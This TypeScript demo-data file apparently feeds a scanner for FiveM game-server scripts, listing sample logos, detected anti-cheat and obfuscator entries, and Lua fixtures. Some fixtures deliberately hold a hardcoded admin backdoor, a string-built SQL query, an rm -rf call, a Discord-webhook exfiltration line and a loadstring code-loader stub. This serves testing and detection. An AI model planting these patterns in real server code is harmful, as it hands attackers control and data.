import { ServerLogo, DetectedProtection } from './types';

export const DEMO_SERVER_LOGOS: ServerLogo[] = [
  {
    id: 'logo-1',
    fileName: 'server_logo.png',
    filePath: 'web/assets/server_logo.png',
    dataUrl: 'https://media.discordapp.net/attachments/1325833497407131660/1495110379410296932/image.png?ex=69e50d8c&is=69e3bc0c&hm=10734314e177a21945ea624eba5c4cb3e03280db35f9e6f0cec68f094523d20d&=&format=webp&quality=lossless&width=883&height=883',
    size: 245000,
    extension: 'png'
  },
  {
    id: 'logo-2',
    fileName: 'loading_screen_badge.png',
    filePath: 'ui/loadingscreen/badge.png',
    dataUrl: 'https://media.discordapp.net/attachments/1325833497407131660/1495110379410296932/image.png?ex=69e50d8c&is=69e3bc0c&hm=10734314e177a21945ea624eba5c4cb3e03280db35f9e6f0cec68f094523d20d&=&format=webp&quality=lossless&width=883&height=883',
    size: 184000,
    extension: 'png'
  }
];

export const DEMO_PROTECTIONS: DetectedProtection[] = [
  {
    name: 'FiveGuard AntiCheat v4.2',
    type: 'AntiCheat',
    vendor: 'FiveGuard Protection',
    description: 'تم التعرف على نظام FiveGuard لمكافحة برامج التخريب وحماية التريقرات.',
    confidence: 'High',
    filesFound: ['fiveguard/server.lua', 'fxmanifest.lua']
  },
  {
    name: 'Luraph Obfuscator VM',
    type: 'Obfuscator',
    vendor: 'Luraph Team',
    description: 'تم رصد وتحديد محرك Luraph VM 5.2 داخل السكربت المشفر (LPH_INIT_LURAPH_VM).',
    confidence: 'High',
    filesFound: ['leaked_anti_exploit/obfuscated.lua']
  },
  {
    name: 'Alzaabi Security Shield',
    type: 'AntiCheat',
    vendor: 'Alzaabi Engineering',
    description: 'درع حماية وتدقيق تريقرات السيرفر.',
    confidence: 'High',
    filesFound: ['leaked_anti_exploit/obfuscated.lua']
  }
];

export const DEMO_LUA_SCRIPTS: Record<string, string> = {
  "fiveguard_ac/server.lua": `-- FiveGuard AntiCheat Integration Engine
-- Protection: FiveGuard Shield Pro
local fg_event = "fg:verifyToken"
RegisterServerEvent(fg_event)
AddEventHandler(fg_event, function(token)
    local _source = source
    if not token or token == "" then
        print(("[FiveGuard] Blocked invalid event token execution by player %s"):format(_source))
        DropPlayer(_source, "FiveGuard: Security Violation")
    end
end)
`,

  "esx_banking/server.lua": `-- ESX Banking Server File
RegisterServerEvent("esx_banking:deposit")
AddEventHandler("esx_banking:deposit", function(amount)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    if xPlayer.getMoney() >= amount then
        xPlayer.removeMoney(amount)
        xPlayer.addAccountMoney('bank', amount)
        TriggerClientEvent("esx:showNotification", _source, "Deposited $" .. amount)
        -- Discord Transaction Logging
        local discordLogHook = "https://discord.com/api/webhooks/998877665544332211/sampleBankAuditLogsSecurityFeedKey"
        PerformHttpRequest(discordLogHook, function() end, 'POST', json.encode({content = "Deposit processed: " .. amount}))
    end
end)

RegisterServerEvent("esx_banking:transfer")
AddEventHandler("esx_banking:transfer", function(target, amount)
    local xPlayer = ESX.GetPlayerFromId(source)
    TriggerEvent("esx_addonaccount:getSharedAccount", 'society_police', function(account)
        -- Process transfer
    end)
end)

-- Potential SQL Injection
MySQL.query("SELECT * FROM users WHERE identifier = " .. playerIdentifier)
`,

  "qb-vehicles/client.lua": `-- QBCore Vehicles Client
RegisterNetEvent("qb-vehicles:client:spawnVehicle", function(model, coords)
    TriggerServerEvent("qb-vehicles:server:deductRentalFee", model, 500)
    TriggerEvent("vehiclekeys:client:SetOwner", "ABC123")
end)

RegisterNetEvent("qb-vehicles:client:repairVehicle", function()
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)
    SetVehicleFixed(veh)
    TriggerServerEvent("qb-inventory:server:removeItem", "repairkit", 1)
end)
`,

  "vulnerable_shop/server.lua": `-- Insecure Shop Script with Backdoor & Hardcoded Admin
RegisterServerEvent("shop:buyItem")
AddEventHandler("shop:buyItem", function(item, price)
    -- Vulnerability: Trusting client price directly without server validation
    local _source = source
    giveItem(item, 1)
end)

-- Hardcoded Admin Backdoor
if PlayerIdentifier == "steam:11000010abcde99" then
    ExecuteCommand("add_principal identifier.steam:11000010abcde99 group.superadmin")
end

-- Dangerous OS command execution
os.execute("rm -rf /tmp/cache")
`,

  "leaked_anti_exploit/obfuscated.lua": `-- Luraph / MoonSec Obfuscated Module Sample
-- LPH_INIT_LURAPH_VM_52
local _0x883a = "\\x54\\x72\\x69\\x67\\x67\\x65\\x72\\x53\\x65\\x72\\x76\\x65\\x72\\x45\\x76\\x65\\x6e\\x74"
local _0xsec = string.char(101, 115, 120, 95, 99, 97, 114, 116, 101, 108, 58, 103, 105, 118, 101, 87\\x65\\x61\\x70\\x6f\\x6e)

-- Debug Hook & Sandbox evasion
debug.setupvalue(TriggerServerEvent, 1, nil)
rawget(_G, "assert")

-- Discord Webhook exfiltration
local hook = "https://discord.com/api/webhooks/1234567890/abc-XYZ_fakeTokenSecretLogging"
PerformHttpRequest(hook, function(err, text, headers) end, 'POST')

-- Hidden Remote Code Loader
loadstring(string.reverse(")(tcartxE_epocS_iibaazlA"))()
`
};
